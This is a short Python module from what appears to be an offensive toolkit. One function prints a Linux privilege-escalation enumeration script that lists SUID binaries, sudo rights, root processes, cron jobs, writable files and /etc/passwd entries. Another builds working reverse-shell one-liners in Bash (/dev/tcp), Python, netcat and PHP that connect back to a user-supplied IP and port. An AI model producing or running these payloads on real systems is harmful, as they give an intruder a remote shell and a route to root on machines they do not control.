import sys
from core.colors import red, green, yellow, highlight

def generate_linux_script():
    print(f"\n{green('[+]')} Generating '5-Minute Enum' Script:")
    
    script = """
    echo "--- [1] WHO AM I? ---"
    id; whoami; groups; sudo -l
    
    echo "\\n--- [2] WHAT CAN I RUN? (SUID) ---"
    find / -perm -u=s -type f 2>/dev/null
    find / -perm -4000 2>/dev/null
    
    echo "\\n--- [3] WHATS RUNNING? ---"
    ps aux | grep root
    netstat -tulpn
    
    echo "\\n--- [4] INTERESTING FILES ---"
    cat /etc/passwd | grep "sh$"
    ls -la /etc/cron.*
    cat /etc/crontab
    ls -la /home/
    
    echo "\\n--- [5] WRITABLE FILES ---"
    find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/" | head -n 20
    
    echo "\\n--- [6] KERNEL ---"
    uname -a; cat /etc/os-release
    """
    print(highlight(script))

def generate_reverse_shell(ip, port):
    print(f"\n{green('[+]')} Generating Reverse Shells for {ip}:{port}")
    
    shells = [
        f"Bash: bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        f"Python: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        f"Netcat: nc -e /bin/sh {ip} {port}",
        f"PHP: php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ]
    
    for shell in shells:
        print(f"\n{yellow('[*]')} {shell}")

def run_privesc(target):
    if target == "script":
        generate_linux_script()
        return

    if ":" in target:
        try:
            ip, port = target.split(":")
            generate_reverse_shell(ip, port)
        except ValueError:
            print(f"{red('[-]')} Invalid format. Use IP:PORT")
    else:
        print(f"{red('[-]')} Unknown command. Use 'script' or 'IP:PORT'.")